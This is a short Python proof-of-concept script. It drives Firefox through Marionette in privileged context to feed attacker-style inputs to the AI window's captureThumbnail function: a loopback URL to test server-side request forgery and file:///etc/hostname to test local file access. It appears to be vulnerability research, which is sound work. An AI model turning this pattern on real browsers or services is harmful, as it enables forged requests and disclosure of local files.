from marionette_driver.marionette import Marionette
import json, time

m = Marionette(host="127.0.0.1", port=2828)
m.start_session()
m.set_context("chrome")   # parent process, system principal

# Exercise the EXACT function AIChatContentParent.#handleRequestAssets calls:
#   lazy.captureThumbnail(thumbnail)  from HistoryThumbnails.sys.mjs
# with attacker-controlled URLs a compromised content process could supply via
# the AIChatContent:RequestAssets IPC message (items[].thumbnail).
script = r"""
const [ssrfUrl, fileUrl, doneKey] = arguments;
const { captureThumbnail } = ChromeUtils.importESModule(
  "moz-src:///browser/components/aiwindow/models/HistoryThumbnails.sys.mjs"
);
const results = {};
const run = async () => {
  // 1) SSRF: force the PARENT process to fetch an attacker URL.
  try { results.ssrf = await captureThumbnail(ssrfUrl); }
  catch (e) { results.ssrfErr = String(e); }
  // 2) file:// oracle: does captureThumbnail load a local file scheme at all?
  try { results.file = await captureThumbnail(fileUrl); }
  catch (e) { results.fileErr = String(e); }
  return results;
};
// Marionette executeAsyncScript callback is the last argument
const cb = arguments[arguments.length - 1];
run().then(r => cb(JSON.stringify(r)), e => cb("THREW:"+String(e)));
"""
m.timeout.script = 60
ssrf = "http://127.0.0.1:8899/ssrf-from-parent-process"
fileu = "file:///etc/hostname"
out = m.execute_async_script(script, script_args=[ssrf, fileu, "done"])
print("RESULT:", out)
m.delete_session()
